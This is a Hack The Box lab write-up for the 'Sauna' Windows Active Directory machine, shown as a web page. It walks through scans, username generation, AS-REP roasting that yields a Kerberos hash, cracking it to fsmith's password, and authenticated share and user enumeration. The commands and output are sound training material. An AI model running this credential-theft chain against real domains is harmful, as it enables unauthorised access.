@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Sauna | Paracausal Telemetry</title><meta name="description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), AS-REP roasting." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sauna/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Sauna" /><meta property="og:description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), AS-REP roasting." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sauna/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sauna/og.png?v=eb6bc5ba" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Sauna" /><meta name="twitter:description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), AS-REP roasting." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sauna/og.png?v=eb6bc5ba" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Sauna","description":"Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), AS-REP roasting.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sauna/","datePublished":"2026-04-06","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Sauna","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sauna/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Sauna</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-06 · 10 min read</p><h1>Sauna</h1><p>Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), AS-REP roasting.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · easy</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Sauna" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-sauna.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-sauna.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Sauna</h2><p>Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for…</p></div><span class="room-badge room-badge-easy">Easy</span></div><dl class="room-facts"><div><dt>Released</dt><dd>15 Feb 2020</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>egotisticalSW</dd></div><div><dt>Rating</dt><dd>4.5 / 5</dd></div><div><dt>User owns</dt><dd>26,132</dd></div><div><dt>Root owns</dt><dd>24,513</dd></div><div><dt>User blood</dt><dd>InfoSecJack<small class="room-blood-time">0H 17M 42S</small></dd></div><div><dt>Root blood</dt><dd>x4nt0n<small class="room-blood-time">1H 3M 28S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 33663 votes from easiest to hardest"><rect x="0" y="54" width="20" height="10" rx="2" fill="hsl(96 70% 55%)"><title>1407 votes</title></rect><rect x="26" y="48" width="20" height="16" rx="2" fill="hsl(96 70% 55%)"><title>2372 votes</title></rect><rect x="52" y="9" width="20" height="55" rx="2" fill="hsl(80 70% 55%)"><title>8146 votes</title></rect><rect x="78" y="19" width="20" height="45" rx="2" fill="hsl(70 70% 55%)"><title>6630 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>9475 votes</title></rect><rect x="130" y="47" width="20" height="17" rx="2" fill="hsl(38 70% 55%)"><title>2445 votes</title></rect><rect x="156" y="53" width="20" height="11" rx="2" fill="hsl(28 70% 55%)"><title>1694 votes</title></rect><rect x="182" y="58" width="20" height="6" rx="2" fill="hsl(16 70% 55%)"><title>859 votes</title></rect><rect x="208" y="62" width="20" height="2" rx="2" fill="hsl(8 70% 55%)"><title>259 votes</title></rect><rect x="234" y="61" width="20" height="3" rx="2" fill="hsl(0 70% 55%)"><title>376 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 7.2, Real-Life 6.9, CVE 6.0, Custom Exploitation 4.0, CTF-Like 3.1"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,59.6 155.9,95.1 134.7,144.0 93.5,132.7 89.4,103.3" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Sauna" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=3000 -sT 10.129.95.180
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-08 21:16 +0000
+Nmap scan report for SAUNA.EGOTISTICAL-BANK.LOCAL (10.129.95.180)
+Host is up (0.017s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49674/tcp open  unknown
+49676/tcp open  unknown
+49685/tcp open  unknown
+49692/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 43.95 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=3000 -sT EGOTISTICAL-BANK.LOCAL
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-08 21:20 +0000
+Nmap scan report for EGOTISTICAL-BANK.LOCAL (10.129.95.180)
+Host is up (0.017s latency).
+rDNS record for 10.129.95.180: SAUNA.EGOTISTICAL-BANK.LOCAL
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-09 04:20:22Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>Domain controller is running at +7h</p><h2>SMB (445)</h2><p>Null auth is enabled, cannot list shares or enumerate users Guest account is disabled</p><h2>HTTP (80)</h2><h3>Nuclei</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nuclei -u http://EGOTISTICAL-BANK.LOCAL/                      
+
+[iis-shortname-detect] [http] [info] http://EGOTISTICAL-BANK.LOCAL/*~1*/a.aspx
+[iis-shortname-detect] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ga2pcdrh*~1*/a.aspx
+[iis-shortname-detect] [http] [info] http://EGOTISTICAL-BANK.LOCAL/*~1*/a.aspx
+[waf-detect:modsecurity] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[ldap-metadata] [javascript] [info] EGOTISTICAL-BANK.LOCAL:389 [&quot;ForestFunctionality: 7&quot;,&quot;DomainControllerFunctionality: 7&quot;,&quot;BaseDN: dc=389&quot;,&quot;DnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL&quot;,&quot;DefaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL&quot;,&quot;DomainFunctionality: 7&quot;]
+[smb-version-detect:smb-version] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 [&quot;SMB 2.1&quot;]
+[smb2-capabilities] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 [&quot;[&quot;DFSSupport&quot;,&quot;LargeMTU&quot;,&quot;Leasing&quot;]&quot;]
+[smb2-server-time] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 [&quot;SystemTime: 2026-03-09T04:28:55.000Z ServerStartTime: 2009-04-22T19:24:48.000Z&quot;]
+[smb-enum-domains] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 [&quot;DomainName: EGOTISTICAL-BANK.LOCAL&quot;]
+[smb-enum] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 [&quot;ForestName: EGOTISTICAL-BANK.LOCAL&quot;,&quot;OSVersion: 10.0.17763&quot;,&quot;NetBIOSComputerName: SAUNA&quot;,&quot;NetBIOSDomainName: EGOTISTICALBANK&quot;,&quot;DNSComputerNamen: SAUNA.EGOTISTICAL-BANK.LOCAL&quot;,&quot;DNSComputerName: SAUNA.EGOTISTICAL-BANK.LOCAL&quot;]
+[smb-os-detect] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 [&quot;Windows Server 2019, Version 1809&quot;]
+[ldap-anonymous-login-detect] [javascript] [medium] EGOTISTICAL-BANK.LOCAL:389
+[old-copyright] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ [&quot;\u00a9 2019&quot;]
+[http-missing-security-headers:x-frame-options] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[http-missing-security-headers:clear-site-data] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[http-missing-security-headers:permissions-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[http-missing-security-headers:x-content-type-options] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[http-missing-security-headers:referrer-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[http-missing-security-headers:strict-transport-security] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[http-missing-security-headers:content-security-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[form-detection] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[missing-sri] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ [&quot;//fonts.googleapis.com/css?family=Catamaran:100,200,300,400,500,600,700,800&quot;]
+[tech-detect:font-awesome] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[tech-detect:bootstrap] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[tech-detect:google-font-api] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[tech-detect:ms-iis] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[microsoft-iis-version] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ [&quot;Microsoft-IIS/10.0&quot;]
+[addeventlistener-detect] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
+[email-extractor] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ [&quot;example@email.com&quot;,&quot;info@example.com&quot;]
+[options-method] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ [&quot;OPTIONS, TRACE, GET, HEAD, POST&quot;]
+[caa-fingerprint] [dns] [info] EGOTISTICAL-BANK.LOCAL</code></pre><h3>Ffuf for vhosts</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nothing found</code></pre><h3>Feroxbuster</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">feroxbuster -u http://EGOTISTICAL-BANK.LOCAL// -C 404
+
+301      GET        2l       10w      160c http://egotistical-bank.local/images =&gt; http://egotistical-bank.local/images/
+301      GET        2l       10w      157c http://egotistical-bank.local/css =&gt; http://egotistical-bank.local/css/
+200      GET      385l     1324w    14226c http://egotistical-bank.local/css/slider.css
+200      GET      122l      750w    60163c http://egotistical-bank.local/images/t4.jpg
+200      GET      325l      770w    15634c http://egotistical-bank.local/contact.html
+200      GET      684l     1814w    38059c http://egotistical-bank.local/single.html
+301      GET        2l       10w      160c http://egotistical-bank.local/Images =&gt; http://egotistical-bank.local/Images/
+200      GET      138l      940w    76395c http://egotistical-bank.local/images/t3.jpg
+301      GET        2l       10w      159c http://egotistical-bank.local/fonts =&gt; http://egotistical-bank.local/fonts/
+200      GET     2337l     3940w    37414c http://egotistical-bank.local/css/font-awesome.css
+200      GET     8975l    17530w   178152c http://egotistical-bank.local/css/bootstrap.css
+200      GET      389l     1987w   159728c http://egotistical-bank.local/images/ab.jpg
+200      GET     2168l     4106w    37019c http://egotistical-bank.local/css/style.css
+301      GET        2l       10w      157c http://egotistical-bank.local/CSS =&gt; http://egotistical-bank.local/CSS/
+200      GET      640l     1767w    30954c http://egotistical-bank.local/about.html
+200      GET      470l     1279w    24695c http://egotistical-bank.local/blog.html
+200      GET      111l      661w    50106c http://egotistical-bank.local/images/t1.jpg
+200      GET      144l      850w    71769c http://egotistical-bank.local/images/t2.jpg
+200      GET      268l     2037w   191775c http://egotistical-bank.local/images/skill2.jpg
+200      GET      683l     1813w    32797c http://egotistical-bank.local/index.html
+200      GET      657l     3746w   345763c http://egotistical-bank.local/images/skill1.jpg
+200      GET      683l     1813w    32797c http://egotistical-bank.local/
+301      GET        2l       10w      157c http://egotistical-bank.local/Css =&gt; http://egotistical-bank.local/Css/
+301      GET        2l       10w      160c http://egotistical-bank.local/IMAGES =&gt; http://egotistical-bank.local/IMAGES/
+301      GET        2l       10w      159c http://egotistical-bank.local/Fonts =&gt; http://egotistical-bank.local/Fonts/</code></pre><h3>Website functionality</h3><p><img src="images/sauna/pasted-image-20260406002629.webp" alt="Screenshot" loading="lazy" /> Found some users on the system</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Fergus Smith
+Shaun Coins
+Hugo Bear
+Bowie Taylor
+Sophie Driver
+Steven Kerb</code></pre><p>Ill use username anarchy to create a userlist</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">./username-anarchy -i ../users.txt &gt; ../user-variations.txt</code></pre><p>This created the list for me</p><h2>AS-REP roasting</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">kerbrute userenum -d egotistical-bank.local --dc sauna.egotistical-bank.local user-variations.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 03/08/26 - Ronnie Flathers @ropnop
+
+2026/03/08 21:48:08 &gt;  Using KDC(s):
+2026/03/08 21:48:08 &gt;  	sauna.egotistical-bank.local:88
+
+2026/03/08 21:48:08 &gt;  [+] VALID USERNAME:	 fsmith@egotistical-bank.local
+2026/03/08 21:48:08 &gt;  Done! Tested 88 usernames (1 valid) in 0.172 seconds</code></pre><p>Using the list i got from username anarchy i validated users</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap sauna.egotistical-bank.local -u fsmith -p &#39;&#39; --asreproast asrep.hash 
+LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert)
+LDAP        10.129.95.180   389    SAUNA            $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b6d3350e166f24ec9b95dbfa2e5d7486$b64b0d64b8bcba222ecce7938f0d7cb19e91722f3237e3ef668eae419149512837ac0629430b97209d74f89df11a57c2594765880870916bd97b918f07d5954b1de0d9f42f4a762bb61c51a224d80be0f77e5bd2c66dd57bde6757c77fe6a4889baf2ee20f471c38e1802f8d93461842695ae1050176640e3cdab6027972795a4ccb653e442b5223d7ea30c6473ff8b1f973a49b128cb16d1a54c3eb129196f8d1c9308e3783330b89bac97b3929cd59007983439d2fd79ae53324a003959b73de1ed30f8d9b83eb8a912e6f6954b8a1b0aa28afd4ac4b3f870211d143ee2abdc6f391ec65c91f4eacd185d36c3c3183b95786a8536852185fa44864c15c6dd7</code></pre><p>Ive found a hash</p><h3>Cracking the hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat asrep.hash /usr/share/wordlists/rockyou.txt
+
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b6d3350e166f24ec9b95dbfa2e5d7486$b64b0d64b8bcba222ecce7938f0d7cb19e91722f3237e3ef668eae419149512837ac0629430b97209d74f89df11a57c2594765880870916bd97b918f07d5954b1de0d9f42f4a762bb61c51a224d80be0f77e5bd2c66dd57bde6757c77fe6a4889baf2ee20f471c38e1802f8d93461842695ae1050176640e3cdab6027972795a4ccb653e442b5223d7ea30c6473ff8b1f973a49b128cb16d1a54c3eb129196f8d1c9308e3783330b89bac97b3929cd59007983439d2fd79ae53324a003959b73de1ed30f8d9b83eb8a912e6f6954b8a1b0aa28afd4ac4b3f870211d143ee2abdc6f391ec65c91f4eacd185d36c3c3183b95786a8536852185fa44864c15c6dd7:Thestrokes23</code></pre><p>The hash cracked</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">fsmith:Thestrokes23</code></pre><p>Now i can verify access</p><h2>Compromising <code>fsmith</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u &#39;fsmith&#39; -p &#39;Thestrokes23&#39; --shares
+SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
+SMB         10.129.95.180   445    SAUNA            [*] Enumerated shares
+SMB         10.129.95.180   445    SAUNA            Share           Permissions     Remark
+SMB         10.129.95.180   445    SAUNA            -----           -----------     ------
+SMB         10.129.95.180   445    SAUNA            ADMIN$                          Remote Admin
+SMB         10.129.95.180   445    SAUNA            C$                              Default share
+SMB         10.129.95.180   445    SAUNA            IPC$            READ            Remote IPC
+SMB         10.129.95.180   445    SAUNA            NETLOGON        READ            Logon server share 
+SMB         10.129.95.180   445    SAUNA            print$          READ            Printer Drivers
+SMB         10.129.95.180   445    SAUNA            RICOH Aficio SP 8300DN PCL 6 WRITE           We cant print money
+SMB         10.129.95.180   445    SAUNA            SYSVOL          READ            Logon server share</code></pre><p>The user is compromised, also has access on two non-default shares Now i can also dump users</p><h3>Dumping users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u &#39;fsmith&#39; -p &#39;Thestrokes23&#39; --users-export users.txt              
+SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
+SMB         10.129.95.180   445    SAUNA            -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.95.180   445    SAUNA            Administrator                 2021-07-26 16:16:16 2       Built-in account for administering the computer/domain 
+SMB         10.129.95.180   445    SAUNA            Guest                         &lt;never&gt;             2       Built-in account for guest access to the computer/domain 
+SMB         10.129.95.180   445    SAUNA            krbtgt                        2020-01-23 05:45:30 0       Key Distribution Center Service Account 
+SMB         10.129.95.180   445    SAUNA            HSmith                        2020-01-23 05:54:34 0        
+SMB         10.129.95.180   445    SAUNA            FSmith                        2020-01-23 16:45:19 0        
+SMB         10.129.95.180   445    SAUNA            svc_loanmgr                   2020-01-24 23:48:31 0        
+SMB         10.129.95.180   445    SAUNA            [*] Enumerated 6 local users: EGOTISTICALBANK
